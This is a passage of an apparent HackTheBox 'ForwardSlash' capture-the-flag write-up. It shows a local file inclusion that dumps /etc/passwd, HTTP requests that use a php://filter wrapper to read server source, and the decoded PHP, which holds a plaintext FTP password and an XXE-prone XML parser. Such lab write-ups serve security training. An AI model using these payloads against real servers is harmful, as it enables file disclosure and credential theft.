+    <span class="nt">&lt;/style&gt;</span>
+<span class="nt">&lt;/head&gt;</span>
+<span class="nt">&lt;body&gt;</span>
+    <span class="nt">&lt;div</span> <span class="na">class=</span><span class="s">"page-header"</span><span class="nt">&gt;</span>
+        <span class="nt">&lt;h1&gt;</span>Change your Profile Picture!<span class="nt">&lt;/h1&gt;</span>
+	<span class="nt">&lt;font</span> <span class="na">style=</span><span class="s">"color:red"</span><span class="nt">&gt;</span>This has all been disabled while we try to get back on our feet after the hack.<span class="nt">&lt;br&gt;&lt;b&gt;</span>-Pain<span class="nt">&lt;/b&gt;&lt;/font&gt;</span>
+    <span class="nt">&lt;/div&gt;</span>
+<span class="nt">&lt;form</span> <span class="na">action=</span><span class="s">"/profilepicture.php"</span> <span class="na">method=</span><span class="s">"post"</span><span class="nt">&gt;</span>
+        URL:
+        <span class="nt">&lt;input</span> <span class="na">type=</span><span class="s">"text"</span> <span class="na">name=</span><span class="s">"url"</span> <span class="na">disabled</span> <span class="na">style=</span><span class="s">"width:600px"</span><span class="nt">&gt;&lt;br&gt;</span>
+        <span class="nt">&lt;input</span> <span class="na">style=</span><span class="s">"width:200px"</span> <span class="na">type=</span><span class="s">"submit"</span> <span class="na">value=</span><span class="s">"Submit"</span> <span class="na">disabled</span><span class="nt">&gt;</span>
+<span class="nt">&lt;/form&gt;</span>
+<span class="nt">&lt;/body&gt;</span>
+<span class="nt">&lt;/html&gt;</span>
+root:x:0:0:root:/root:/bin/bash
+daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
+bin:x:2:2:bin:/bin:/usr/sbin/nologin
+sys:x:3:3:sys:/dev:/usr/sbin/nologin
+sync:x:4:65534:sync:/bin:/bin/sync
+games:x:5:60:games:/usr/games:/usr/sbin/nologin
+man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
+lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
+mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
+news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
+uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
+proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
+www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
+backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
+list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
+irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
+gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
+nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
+systemd-network:x:100:102:systemd Network Management,,,:/run/systemd/netif:/usr/sbin/nologin
+systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd/resolve:/usr/sbin/nologin
+syslog:x:102:106::/home/syslog:/usr/sbin/nologin
+messagebus:x:103:107::/nonexistent:/usr/sbin/nologin
+_apt:x:104:65534::/nonexistent:/usr/sbin/nologin
+lxd:x:105:65534::/var/lib/lxd/:/bin/false
+uuidd:x:106:110::/run/uuidd:/usr/sbin/nologin
+dnsmasq:x:107:65534:dnsmasq,,,:/var/lib/misc:/usr/sbin/nologin
+landscape:x:108:112::/var/lib/landscape:/usr/sbin/nologin
+pollinate:x:109:1::/var/cache/pollinate:/bin/false
+sshd:x:110:65534::/run/sshd:/usr/sbin/nologin
+pain:x:1000:1000:pain:/home/pain:/bin/bash
+chiv:x:1001:1001:Chivato,,,:/home/chiv:/bin/bash
+mysql:x:111:113:MySQL Server,,,:/nonexistent:/bin/false
+</pre></table></code></div></div><p>And hell yeah we got the <code class="language-plaintext highlighter-rouge">lfi</code> working.And now i remember the <code class="language-plaintext highlighter-rouge">/dev</code> dir that was forbidden for us.</p><p>Now we can try to extract that file</p><div class="language-http highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+12
+13
+14
+15
+16
+</pre><td class="rouge-code"><pre><span class="nf">POST</span> <span class="nn">/profilepicture.php</span> <span class="k">HTTP</span><span class="o">/</span><span class="m">1.1</span>
+<span class="na">Host</span><span class="p">:</span> <span class="s">backup.forwardslash.htb</span>
+<span class="na">Content-Length</span><span class="p">:</span> <span class="s">57</span>
+<span class="na">Cache-Control</span><span class="p">:</span> <span class="s">max-age=0</span>
+<span class="na">Origin</span><span class="p">:</span> <span class="s">http://backup.forwardslash.htb</span>
+<span class="na">Upgrade-Insecure-Requests</span><span class="p">:</span> <span class="s">1</span>
+<span class="na">Content-Type</span><span class="p">:</span> <span class="s">application/x-www-form-urlencoded</span>
+<span class="na">User-Agent</span><span class="p">:</span> <span class="s">Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.122 Safari/537.36</span>
+<span class="na">Accept</span><span class="p">:</span> <span class="s">text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9</span>
+<span class="na">Referer</span><span class="p">:</span> <span class="s">http://backup.forwardslash.htb/profilepicture.php</span>
+<span class="na">Accept-Encoding</span><span class="p">:</span> <span class="s">gzip, deflate</span>
+<span class="na">Accept-Language</span><span class="p">:</span> <span class="s">en-US,en;q=0.9,hi;q=0.8</span>
+<span class="na">Cookie</span><span class="p">:</span> <span class="s">PHPSESSID=l1nm05k0co9fmed61jnud97usg</span>
+<span class="na">Connection</span><span class="p">:</span> <span class="s">close</span>
+
+url=file:///var/www/backup.forwardslash.htb/dev/index.php
+</pre></table></code></div></div><p>Response was</p><div class="language-http highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+12
+13
+14
+15
+16
+17
+18
+19
+20
+21
+22
+23
+24
+25
+26
+27
+28
+29
+30
+31
+32
+33
+</pre><td class="rouge-code"><pre><span class="k">HTTP</span><span class="o">/</span><span class="m">1.1</span> <span class="m">200</span> <span class="ne">OK</span>
+<span class="na">Date</span><span class="p">:</span> <span class="s">Tue, 21 Apr 2020 11:15:33 GMT</span>
+<span class="na">Server</span><span class="p">:</span> <span class="s">Apache/2.4.29 (Ubuntu)</span>
+<span class="na">Expires</span><span class="p">:</span> <span class="s">Thu, 19 Nov 1981 08:52:00 GMT</span>
+<span class="na">Cache-Control</span><span class="p">:</span> <span class="s">no-store, no-cache, must-revalidate</span>
+<span class="na">Pragma</span><span class="p">:</span> <span class="s">no-cache</span>
+<span class="na">Vary</span><span class="p">:</span> <span class="s">Accept-Encoding</span>
+<span class="na">Content-Length</span><span class="p">:</span> <span class="s">723</span>
+<span class="na">Connection</span><span class="p">:</span> <span class="s">close</span>
+<span class="na">Content-Type</span><span class="p">:</span> <span class="s">text/html; charset=UTF-8</span>
+
+<span class="cp">&lt;!DOCTYPE html&gt;</span>
+<span class="nt">&lt;head&gt;</span>
+    <span class="nt">&lt;meta</span> <span class="na">charset=</span><span class="s">"UTF-8"</span><span class="nt">&gt;</span>
+    <span class="nt">&lt;title&gt;</span>Welcome<span class="nt">&lt;/title&gt;</span>
+    <span class="nt">&lt;link</span> <span class="na">rel=</span><span class="s">"stylesheet"</span> <span class="na">href=</span><span class="s">"bootstrap.css"</span><span class="nt">&gt;</span>
+    <span class="nt">&lt;style </span><span class="na">type=</span><span class="s">"text/css"</span><span class="nt">&gt;</span>
+        <span class="nt">body</span><span class="p">{</span> <span class="nl">font</span><span class="p">:</span> <span class="m">14px</span> <span class="nb">sans-serif</span><span class="p">;</span> <span class="nl">text-align</span><span class="p">:</span> <span class="nb">center</span><span class="p">;</span> <span class="p">}</span>
+    <span class="nt">&lt;/style&gt;</span>
+<span class="nt">&lt;/head&gt;</span>
+<span class="nt">&lt;body&gt;</span>
+    <span class="nt">&lt;div</span> <span class="na">class=</span><span class="s">"page-header"</span><span class="nt">&gt;</span>
+        <span class="nt">&lt;h1&gt;</span>Change your Profile Picture!<span class="nt">&lt;/h1&gt;</span>
+	<span class="nt">&lt;font</span> <span class="na">style=</span><span class="s">"color:red"</span><span class="nt">&gt;</span>This has all been disabled while we try to get back on our feet after the hack.<span class="nt">&lt;br&gt;&lt;b&gt;</span>-Pain<span class="nt">&lt;/b&gt;&lt;/font&gt;</span>
+    <span class="nt">&lt;/div&gt;</span>
+<span class="nt">&lt;form</span> <span class="na">action=</span><span class="s">"/profilepicture.php"</span> <span class="na">method=</span><span class="s">"post"</span><span class="nt">&gt;</span>
+        URL:
+        <span class="nt">&lt;input</span> <span class="na">type=</span><span class="s">"text"</span> <span class="na">name=</span><span class="s">"url"</span> <span class="na">disabled</span> <span class="na">style=</span><span class="s">"width:600px"</span><span class="nt">&gt;&lt;br&gt;</span>
+        <span class="nt">&lt;input</span> <span class="na">style=</span><span class="s">"width:200px"</span> <span class="na">type=</span><span class="s">"submit"</span> <span class="na">value=</span><span class="s">"Submit"</span> <span class="na">disabled</span><span class="nt">&gt;</span>
+<span class="nt">&lt;/form&gt;</span>
+<span class="nt">&lt;/body&gt;</span>
+<span class="nt">&lt;/html&gt;</span>
+Permission Denied; not that way ;)
+</pre></table></code></div></div><p>We got a line at the last <code class="language-plaintext highlighter-rouge">Permission Denied; not that way ;)</code> hmmm…cool.!!</p><p>Now here it comes the <code class="language-plaintext highlighter-rouge">main</code> thing.We can try to include the php files using php <code class="language-plaintext highlighter-rouge">Wrapper</code>.</p><p>You can read about it on <a href="https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/File%20Inclusion#wrapper-phpfilter" target="_blank">PayloadAllTheThings</a></p><p>now i try to include the <code class="language-plaintext highlighter-rouge">/var/www/backup.forwardslash.htb/dev/index.php</code>.</p><p><code class="language-plaintext highlighter-rouge">Request</code></p><div class="language-http highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+12
+13
+14
+15
+16
+</pre><td class="rouge-code"><pre><span class="nf">POST</span> <span class="nn">/profilepicture.php</span> <span class="k">HTTP</span><span class="o">/</span><span class="m">1.1</span>
+<span class="na">Host</span><span class="p">:</span> <span class="s">backup.forwardslash.htb</span>
+<span class="na">Content-Length</span><span class="p">:</span> <span class="s">101</span>
+<span class="na">Cache-Control</span><span class="p">:</span> <span class="s">max-age=0</span>
+<span class="na">Origin</span><span class="p">:</span> <span class="s">http://backup.forwardslash.htb</span>
+<span class="na">Upgrade-Insecure-Requests</span><span class="p">:</span> <span class="s">1</span>
+<span class="na">Content-Type</span><span class="p">:</span> <span class="s">application/x-www-form-urlencoded</span>
+<span class="na">User-Agent</span><span class="p">:</span> <span class="s">Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.122 Safari/537.36</span>
+<span class="na">Accept</span><span class="p">:</span> <span class="s">text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9</span>
+<span class="na">Referer</span><span class="p">:</span> <span class="s">http://backup.forwardslash.htb/profilepicture.php</span>
+<span class="na">Accept-Encoding</span><span class="p">:</span> <span class="s">gzip, deflate</span>
+<span class="na">Accept-Language</span><span class="p">:</span> <span class="s">en-US,en;q=0.9,hi;q=0.8</span>
+<span class="na">Cookie</span><span class="p">:</span> <span class="s">PHPSESSID=l1nm05k0co9fmed61jnud97usg</span>
+<span class="na">Connection</span><span class="p">:</span> <span class="s">close</span>
+
+url=php://filter/convert.base64-encode/resource=file:///var/www/backup.forwardslash.htb/dev/index.php
+</pre></table></code></div></div><p><code class="language-plaintext highlighter-rouge">Response</code></p><div class="language-http highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+12
+13
+14
+15
+16
+17
+18
+19
+20
+21
+22
+23
+24
+25
+26
+27
+28
+29
+30
+31
+32
+33
+</pre><td class="rouge-code"><pre><span class="k">HTTP</span><span class="o">/</span><span class="m">1.1</span> <span class="m">200</span> <span class="ne">OK</span>
+<span class="na">Date</span><span class="p">:</span> <span class="s">Tue, 21 Apr 2020 11:23:25 GMT</span>
+<span class="na">Server</span><span class="p">:</span> <span class="s">Apache/2.4.29 (Ubuntu)</span>
+<span class="na">Expires</span><span class="p">:</span> <span class="s">Thu, 19 Nov 1981 08:52:00 GMT</span>
+<span class="na">Cache-Control</span><span class="p">:</span> <span class="s">no-store, no-cache, must-revalidate</span>
+<span class="na">Pragma</span><span class="p">:</span> <span class="s">no-cache</span>
+<span class="na">Vary</span><span class="p">:</span> <span class="s">Accept-Encoding</span>
+<span class="na">Content-Length</span><span class="p">:</span> <span class="s">3361</span>
+<span class="na">Connection</span><span class="p">:</span> <span class="s">close</span>
+<span class="na">Content-Type</span><span class="p">:</span> <span class="s">text/html; charset=UTF-8</span>
+
+<span class="cp">&lt;!DOCTYPE html&gt;</span>
+<span class="nt">&lt;head&gt;</span>
+    <span class="nt">&lt;meta</span> <span class="na">charset=</span><span class="s">"UTF-8"</span><span class="nt">&gt;</span>
+    <span class="nt">&lt;title&gt;</span>Welcome<span class="nt">&lt;/title&gt;</span>
+    <span class="nt">&lt;link</span> <span class="na">rel=</span><span class="s">"stylesheet"</span> <span class="na">href=</span><span class="s">"bootstrap.css"</span><span class="nt">&gt;</span>
+    <span class="nt">&lt;style </span><span class="na">type=</span><span class="s">"text/css"</span><span class="nt">&gt;</span>
+        <span class="nt">body</span><span class="p">{</span> <span class="nl">font</span><span class="p">:</span> <span class="m">14px</span> <span class="nb">sans-serif</span><span class="p">;</span> <span class="nl">text-align</span><span class="p">:</span> <span class="nb">center</span><span class="p">;</span> <span class="p">}</span>
+    <span class="nt">&lt;/style&gt;</span>
+<span class="nt">&lt;/head&gt;</span>
+<span class="nt">&lt;body&gt;</span>
+    <span class="nt">&lt;div</span> <span class="na">class=</span><span class="s">"page-header"</span><span class="nt">&gt;</span>
+        <span class="nt">&lt;h1&gt;</span>Change your Profile Picture!<span class="nt">&lt;/h1&gt;</span>
+	<span class="nt">&lt;font</span> <span class="na">style=</span><span class="s">"color:red"</span><span class="nt">&gt;</span>This has all been disabled while we try to get back on our feet after the hack.<span class="nt">&lt;br&gt;&lt;b&gt;</span>-Pain<span class="nt">&lt;/b&gt;&lt;/font&gt;</span>
+    <span class="nt">&lt;/div&gt;</span>
+<span class="nt">&lt;form</span> <span class="na">action=</span><span class="s">"/profilepicture.php"</span> <span class="na">method=</span><span class="s">"post"</span><span class="nt">&gt;</span>
+        URL:
+        <span class="nt">&lt;input</span> <span class="na">type=</span><span class="s">"text"</span> <span class="na">name=</span><span class="s">"url"</span> <span class="na">disabled</span> <span class="na">style=</span><span class="s">"width:600px"</span><span class="nt">&gt;&lt;br&gt;</span>
+        <span class="nt">&lt;input</span> <span class="na">style=</span><span class="s">"width:200px"</span> <span class="na">type=</span><span class="s">"submit"</span> <span class="na">value=</span><span class="s">"Submit"</span> <span class="na">disabled</span><span class="nt">&gt;</span>
+<span class="nt">&lt;/form&gt;</span>
+<span class="nt">&lt;/body&gt;</span>
+<span class="nt">&lt;/html&gt;</span>
+PD9waHAKLy9pbmNsdWRlX29uY2UgLi4vc2Vzc2lvbi5waHA7Ci8vIEluaXRpYWxpemUgdGhlIHNlc3Npb24Kc2Vzc2lvbl9zdGFydCgpOwoKaWYoKCFpc3NldCgkX1NFU1NJT05bImxvZ2dlZGluIl0pIHx8ICRfU0VTU0lPTlsibG9nZ2VkaW4iXSAhPT0gdHJ1ZSB8fCAkX1NFU1NJT05bJ3VzZXJuYW1lJ10gIT09ICJhZG1pbiIpICYmICRfU0VSVkVSWydSRU1PVEVfQUREUiddICE9PSAiMTI3LjAuMC4xIil7CiAgICBoZWFkZXIoJ0hUVFAvMS4wIDQwMyBGb3JiaWRkZW4nKTsKICAgIGVjaG8gIjxoMT40MDMgQWNjZXNzIERlbmllZDwvaDE+IjsKICAgIGVjaG8gIjxoMz5BY2Nlc3MgRGVuaWVkIEZyb20gIiwgJF9TRVJWRVJbJ1JFTU9URV9BRERSJ10sICI8L2gzPiI7CiAgICAvL2VjaG8gIjxoMj5SZWRpcmVjdGluZyB0byBsb2dpbiBpbiAzIHNlY29uZHM8L2gyPiIKICAgIC8vZWNobyAnPG1ldGEgaHR0cC1lcXVpdj0icmVmcmVzaCIgY29udGVudD0iMzt1cmw9Li4vbG9naW4ucGhwIiAvPic7CiAgICAvL2hlYWRlcigibG9jYXRpb246IC4uL2xvZ2luLnBocCIpOwogICAgZXhpdDsKfQo/Pgo8aHRtbD4KCTxoMT5YTUwgQXBpIFRlc3Q8L2gxPgoJPGgzPlRoaXMgaXMgb3VyIGFwaSB0ZXN0IGZvciB3aGVuIG91ciBuZXcgd2Vic2l0ZSBnZXRzIHJlZnVyYmlzaGVkPC9oMz4KCTxmb3JtIGFjdGlvbj0iL2Rldi9pbmRleC5waHAiIG1ldGhvZD0iZ2V0IiBpZD0ieG1sdGVzdCI+CgkJPHRleHRhcmVhIG5hbWU9InhtbCIgZm9ybT0ieG1sdGVzdCIgcm93cz0iMjAiIGNvbHM9IjUwIj48YXBpPgogICAgPHJlcXVlc3Q+dGVzdDwvcmVxdWVzdD4KPC9hcGk+CjwvdGV4dGFyZWE+CgkJPGlucHV0IHR5cGU9InN1Ym1pdCI+Cgk8L2Zvcm0+Cgo8L2h0bWw+Cgo8IS0tIFRPRE86CkZpeCBGVFAgTG9naW4KLS0+Cgo8P3BocAppZiAoJF9TRVJWRVJbJ1JFUVVFU1RfTUVUSE9EJ10gPT09ICJHRVQiICYmIGlzc2V0KCRfR0VUWyd4bWwnXSkpIHsKCgkkcmVnID0gJy9mdHA6XC9cL1tcc1xTXSpcL1wiLyc7CgkvLyRyZWcgPSAnLygoKCgyNVswLTVdKXwoMlswLTRdXGQpfChbMDFdP1xkP1xkKSkpXC4pezN9KCgoKDI1WzAtNV0pfCgyWzAtNF1cZCl8KFswMV0/XGQ/XGQpKSkpLycKCglpZiAocHJlZ19tYXRjaCgkcmVnLCAkX0dFVFsneG1sJ10sICRtYXRjaCkpIHsKCQkkaXAgPSBleHBsb2RlKCcvJywgJG1hdGNoWzBdKVsyXTsKCQllY2hvICRpcDsKCQllcnJvcl9sb2coIkNvbm5lY3RpbmciKTsKCgkJJGNvbm5faWQgPSBmdHBfY29ubmVjdCgkaXApIG9yIGRpZSgiQ291bGRuJ3QgY29ubmVjdCB0byAkaXBcbiIpOwoKCQllcnJvcl9sb2coIkxvZ2dpbmcgaW4iKTsKCgkJaWYgKEBmdHBfbG9naW4oJGNvbm5faWQsICJjaGl2IiwgJ04wYm9keUwxa2VzQmFjay8nKSkgewoKCQkJZXJyb3JfbG9nKCJHZXR0aW5nIGZpbGUiKTsKCQkJZWNobyBmdHBfZ2V0X3N0cmluZygkY29ubl9pZCwgImRlYnVnLnR4dCIpOwoJCX0KCgkJZXhpdDsKCX0KCglsaWJ4bWxfZGlzYWJsZV9lbnRpdHlfbG9hZGVyIChmYWxzZSk7CgkkeG1sZmlsZSA9ICRfR0VUWyJ4bWwiXTsKCSRkb20gPSBuZXcgRE9NRG9jdW1lbnQoKTsKCSRkb20tPmxvYWRYTUwoJHhtbGZpbGUsIExJQlhNTF9OT0VOVCB8IExJQlhNTF9EVERMT0FEKTsKCSRhcGkgPSBzaW1wbGV4bWxfaW1wb3J0X2RvbSgkZG9tKTsKCSRyZXEgPSAkYXBpLT5yZXF1ZXN0OwoJZWNobyAiLS0tLS1vdXRwdXQtLS0tLTxicj5cclxuIjsKCWVjaG8gIiRyZXEiOwp9CgpmdW5jdGlvbiBmdHBfZ2V0X3N0cmluZygkZnRwLCAkZmlsZW5hbWUpIHsKICAgICR0ZW1wID0gZm9wZW4oJ3BocDovL3RlbXAnLCAncisnKTsKICAgIGlmIChAZnRwX2ZnZXQoJGZ0cCwgJHRlbXAsICRmaWxlbmFtZSwgRlRQX0JJTkFSWSwgMCkpIHsKICAgICAgICByZXdpbmQoJHRlbXApOwogICAgICAgIHJldHVybiBzdHJlYW1fZ2V0X2NvbnRlbnRzKCR0ZW1wKTsKICAgIH0KICAgIGVsc2UgewogICAgICAgIHJldHVybiBmYWxzZTsKICAgIH0KfQoKPz4K
+</pre></table></code></div></div><p>At the last of the response if you decode it as <code class="language-plaintext highlighter-rouge">base64</code> , We can get the full php file i.e <code class="language-plaintext highlighter-rouge">/dev/index.php</code></p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7 " data-src="/hackthebox/forwardslash/fc3efc98-2e39-4362-a947-742f099ec8fc/image-6.png" alt="Base64 decode" /></p><p>Here is the full <code class="language-plaintext highlighter-rouge">php-code</code></p><div class="language-php highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+12
+13
+14
+15
+16
+17
+18
+19
+20
+21
+22
+23
+24
+25
+26
+27
+28
+29
+30
+31
+32
+33
+34
+35
+36
+37
+38
+39
+40
+41
+42
+43
+44
+45
+46
+47
+48
+49
+50
+51
+52
+53
+54
+55
+56
+57
+58
+59
+60
+61
+62
+63
+64
+65
+66
+67
+68
+69
+70
+71
+72
+73
+74
+75
+76
+77
+78
+</pre><td class="rouge-code"><pre><span class="cp">&lt;?php</span>
+<span class="c1">//include_once ../session.php;</span>
+<span class="c1">// Initialize the session</span>
+<span class="nb">session_start</span><span class="p">();</span>
+
+<span class="k">if</span><span class="p">((</span><span class="o">!</span><span class="nb">isset</span><span class="p">(</span><span class="nv">$_SESSION</span><span class="p">[</span><span class="s2">"loggedin"</span><span class="p">])</span> <span class="o">||</span> <span class="nv">$_SESSION</span><span class="p">[</span><span class="s2">"loggedin"</span><span class="p">]</span> <span class="o">!==</span> <span class="kc">true</span> <span class="o">||</span> <span class="nv">$_SESSION</span><span class="p">[</span><span class="s1">'username'</span><span class="p">]</span> <span class="o">!==</span> <span class="s2">"admin"</span><span class="p">)</span> <span class="o">&amp;&amp;</span> <span class="nv">$_SERVER</span><span class="p">[</span><span class="s1">'REMOTE_ADDR'</span><span class="p">]</span> <span class="o">!==</span> <span class="s2">"127.0.0.1"</span><span class="p">){</span>
+    <span class="nb">header</span><span class="p">(</span><span class="s1">'HTTP/1.0 403 Forbidden'</span><span class="p">);</span>
+    <span class="k">echo</span> <span class="s2">"&lt;h1&gt;403 Access Denied&lt;/h1&gt;"</span><span class="p">;</span>
+    <span class="k">echo</span> <span class="s2">"&lt;h3&gt;Access Denied From "</span><span class="p">,</span> <span class="nv">$_SERVER</span><span class="p">[</span><span class="s1">'REMOTE_ADDR'</span><span class="p">],</span> <span class="s2">"&lt;/h3&gt;"</span><span class="p">;</span>
+    <span class="c1">//echo "&lt;h2&gt;Redirecting to login in 3 seconds&lt;/h2&gt;"</span>
+    <span class="c1">//echo '&lt;meta http-equiv="refresh" content="3;url=../login.php" /&gt;';</span>
+    <span class="c1">//header("location: ../login.php");</span>
+    <span class="k">exit</span><span class="p">;</span>
+<span class="p">}</span>
+<span class="cp">?&gt;</span>
+<span class="nt">&lt;html&gt;</span>
+	<span class="nt">&lt;h1&gt;</span>XML Api Test<span class="nt">&lt;/h1&gt;</span>
+	<span class="nt">&lt;h3&gt;</span>This is our api test for when our new website gets refurbished<span class="nt">&lt;/h3&gt;</span>
+	<span class="nt">&lt;form</span> <span class="na">action=</span><span class="s">"/dev/index.php"</span> <span class="na">method=</span><span class="s">"get"</span> <span class="na">id=</span><span class="s">"xmltest"</span><span class="nt">&gt;</span>
+		<span class="nt">&lt;textarea</span> <span class="na">name=</span><span class="s">"xml"</span> <span class="na">form=</span><span class="s">"xmltest"</span> <span class="na">rows=</span><span class="s">"20"</span> <span class="na">cols=</span><span class="s">"50"</span><span class="nt">&gt;&lt;api&gt;</span>
+    <span class="nt">&lt;request&gt;</span>test<span class="nt">&lt;/request&gt;</span>
+<span class="nt">&lt;/api&gt;</span>
+<span class="nt">&lt;/textarea&gt;</span>
+		<span class="nt">&lt;input</span> <span class="na">type=</span><span class="s">"submit"</span><span class="nt">&gt;</span>
+	<span class="nt">&lt;/form&gt;</span>
+
+<span class="nt">&lt;/html&gt;</span>
+
+<span class="c">&lt;!-- TODO:
+Fix FTP Login
+--&gt;</span>
+
+<span class="cp">&lt;?php</span>
+<span class="k">if</span> <span class="p">(</span><span class="nv">$_SERVER</span><span class="p">[</span><span class="s1">'REQUEST_METHOD'</span><span class="p">]</span> <span class="o">===</span> <span class="s2">"GET"</span> <span class="o">&amp;&amp;</span> <span class="nb">isset</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">'xml'</span><span class="p">]))</span> <span class="p">{</span>
+
+	<span class="nv">$reg</span> <span class="o">=</span> <span class="s1">'/ftp:\/\/[\s\S]*\/\"/'</span><span class="p">;</span>
+	<span class="c1">//$reg = '/((((25[0-5])|(2[0-4]\d)|([01]?\d?\d)))\.){3}((((25[0-5])|(2[0-4]\d)|([01]?\d?\d))))/'</span>
+
+	<span class="k">if</span> <span class="p">(</span><span class="nb">preg_match</span><span class="p">(</span><span class="nv">$reg</span><span class="p">,</span> <span class="nv">$_GET</span><span class="p">[</span><span class="s1">'xml'</span><span class="p">],</span> <span class="nv">$match</span><span class="p">))</span> <span class="p">{</span>
+		<span class="nv">$ip</span> <span class="o">=</span> <span class="nb">explode</span><span class="p">(</span><span class="s1">'/'</span><span class="p">,</span> <span class="nv">$match</span><span class="p">[</span><span class="mi">0</span><span class="p">])[</span><span class="mi">2</span><span class="p">];</span>
+		<span class="k">echo</span> <span class="nv">$ip</span><span class="p">;</span>
+		<span class="nb">error_log</span><span class="p">(</span><span class="s2">"Connecting"</span><span class="p">);</span>
+
+		<span class="nv">$conn_id</span> <span class="o">=</span> <span class="nb">ftp_connect</span><span class="p">(</span><span class="nv">$ip</span><span class="p">)</span> <span class="k">or</span> <span class="k">die</span><span class="p">(</span><span class="s2">"Couldn't connect to </span><span class="nv">$ip</span><span class="se">\n</span><span class="s2">"</span><span class="p">);</span>
+
+		<span class="nb">error_log</span><span class="p">(</span><span class="s2">"Logging in"</span><span class="p">);</span>
+
+		<span class="k">if</span> <span class="p">(</span><span class="o">@</span><span class="nb">ftp_login</span><span class="p">(</span><span class="nv">$conn_id</span><span class="p">,</span> <span class="s2">"chiv"</span><span class="p">,</span> <span class="s1">'N0bodyL1kesBack/'</span><span class="p">))</span> <span class="p">{</span>
+
+			<span class="nb">error_log</span><span class="p">(</span><span class="s2">"Getting file"</span><span class="p">);</span>
+			<span class="k">echo</span> <span class="nx">ftp_get_string</span><span class="p">(</span><span class="nv">$conn_id</span><span class="p">,</span> <span class="s2">"debug.txt"</span><span class="p">);</span>
+		<span class="p">}</span>
+
+		<span class="k">exit</span><span class="p">;</span>
+	<span class="p">}</span>
+
+	<span class="nb">libxml_disable_entity_loader</span> <span class="p">(</span><span class="kc">false</span><span class="p">);</span>
+	<span class="nv">$xmlfile</span> <span class="o">=</span> <span class="nv">$_GET</span><span class="p">[</span><span class="s2">"xml"</span><span class="p">];</span>
+	<span class="nv">$dom</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">DOMDocument</span><span class="p">();</span>
+	<span class="nv">$dom</span><span class="o">-&gt;</span><span class="na">loadXML</span><span class="p">(</span><span class="nv">$xmlfile</span><span class="p">,</span> <span class="nx">LIBXML_NOENT</span> <span class="o">|</span> <span class="nx">LIBXML_DTDLOAD</span><span class="p">);</span>
+	<span class="nv">$api</span> <span class="o">=</span> <span class="nb">simplexml_import_dom</span><span class="p">(</span><span class="nv">$dom</span><span class="p">);</span>
+	<span class="nv">$req</span> <span class="o">=</span> <span class="nv">$api</span><span class="o">-&gt;</span><span class="na">request</span><span class="p">;</span>
+	<span class="k">echo</span> <span class="s2">"-----output-----&lt;br&gt;</span><span class="se">\r\n</span><span class="s2">"</span><span class="p">;</span>
+	<span class="k">echo</span> <span class="s2">"</span><span class="nv">$req</span><span class="s2">"</span><span class="p">;</span>
+<span class="p">}</span>
+
+<span class="k">function</span> <span class="nf">ftp_get_string</span><span class="p">(</span><span class="nv">$ftp</span><span class="p">,</span> <span class="nv">$filename</span><span class="p">)</span> <span class="p">{</span>
+    <span class="nv">$temp</span> <span class="o">=</span> <span class="nb">fopen</span><span class="p">(</span><span class="s1">'php://temp'</span><span class="p">,</span> <span class="s1">'r+'</span><span class="p">);</span>
+    <span class="k">if</span> <span class="p">(</span><span class="o">@</span><span class="nb">ftp_fget</span><span class="p">(</span><span class="nv">$ftp</span><span class="p">,</span> <span class="nv">$temp</span><span class="p">,</span> <span class="nv">$filename</span><span class="p">,</span> <span class="nx">FTP_BINARY</span><span class="p">,</span> <span class="mi">0</span><span class="p">))</span> <span class="p">{</span>
+        <span class="nb">rewind</span><span class="p">(</span><span class="nv">$temp</span><span class="p">);</span>
+        <span class="k">return</span> <span class="nb">stream_get_contents</span><span class="p">(</span><span class="nv">$temp</span><span class="p">);</span>
+    <span class="p">}</span>
+    <span class="k">else</span> <span class="p">{</span>
+        <span class="k">return</span> <span class="kc">false</span><span class="p">;</span>
+    <span class="p">}</span>
+<span class="p">}</span>
+
+<span class="cp">?&gt;</span>
+</pre></table></code></div></div><p>The most interesting line is</p><div class="language-php highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
